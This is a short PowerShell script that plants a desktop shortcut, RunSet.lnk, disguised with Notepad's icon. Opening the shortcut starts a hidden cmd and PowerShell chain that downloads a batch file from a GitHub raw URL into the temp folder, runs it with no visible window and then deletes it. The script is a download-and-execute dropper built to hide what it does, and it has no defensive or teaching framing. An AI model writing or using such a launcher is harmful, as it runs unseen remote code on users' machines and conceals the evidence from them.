$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\RunSet.lnk")

$batUrl = "https://raw.githubusercontent.com/bhekinko/test/main/set.bat"
$batPath = "$env:TEMP\set.bat"

$cmd = "powershell -NoProfile -WindowStyle Hidden -Command `"Invoke-WebRequest -Uri '$batUrl' -OutFile '$batPath'; Start-Process -FilePath '$batPath' -WindowStyle Hidden -Wait; Remove-Item '$batPath'`""

$Shortcut.TargetPath = "cmd.exe"
$Shortcut.Arguments = "/c $cmd"
$Shortcut.WorkingDirectory = $env:TEMP  # ✅ dynamic Start in path
$Shortcut.IconLocation = "notepad.exe, 0"
$Shortcut.Save()
